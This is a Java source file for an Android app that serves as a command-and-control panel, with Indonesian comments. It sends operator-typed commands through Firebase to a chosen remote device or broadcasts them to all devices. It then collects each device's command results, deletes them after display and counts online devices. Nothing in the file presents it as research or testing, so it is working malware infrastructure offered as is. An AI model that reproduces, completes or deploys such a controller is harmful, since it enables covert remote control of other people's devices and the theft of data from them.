package com.enterprise.c2server;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class C2ServerActivity extends AppCompatActivity {
    private EditText commandInput, targetInput;
    private Button sendButton;
    private TextView logView;
    private DatabaseReference rootRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_c2server);

        commandInput = findViewById(R.id.commandInput);
        targetInput = findViewById(R.id.targetInput);
        sendButton = findViewById(R.id.sendButton);
        logView = findViewById(R.id.logView);

        rootRef = FirebaseDatabase.getInstance().getReference();

        sendButton.setOnClickListener(v -> {
            String command = commandInput.getText().toString().trim();
            String target = targetInput.getText().toString().trim();
            if (target.isEmpty()) target = "ALL";

            if (!command.isEmpty()) {
                // Kirim perintah ke Firebase
                if (target.equals("ALL")) {
                    // Broadcast ke semua device
                    rootRef.child("commands").child(target).setValue(command);
                } else {
                    rootRef.child("commands").child(target).setValue(command);
                }
                String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                logView.append("\n[" + timestamp + "] 📤 → " + target + ": " + command);
                commandInput.setText("");
            }
        });

        // Dengarkan hasil dari semua perangkat
        rootRef.child("results").addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                String deviceId = snapshot.getKey();
                for (DataSnapshot resultSnapshot : snapshot.getChildren()) {
                    String cmd = resultSnapshot.child("command").getValue(String.class);
                    String result = resultSnapshot.child("result").getValue(String.class);
                    long timestamp = resultSnapshot.child("timestamp").getValue(Long.class);
                    String timeStr = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(timestamp));
                    logView.append("\n[" + timeStr + "] 📥 " + deviceId + ": " + result);
                }
                // Hapus hasil setelah ditampilkan
                snapshot.getRef().removeValue();
            }
            @Override public void onChildChanged(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onChildRemoved(DataSnapshot snapshot) {}
            @Override public void onChildMoved(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onCancelled(DatabaseError error) {
                logView.append("\n❌ Firebase error: " + error.getMessage());
            }
        });

        // Tampilkan daftar device yang online
        rootRef.child("devices").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                logView.append("\n📱 Online devices: " + snapshot.getChildrenCount());
            }

            @Override
            public void onCancelled(DatabaseError error) {}
        });
    }
}
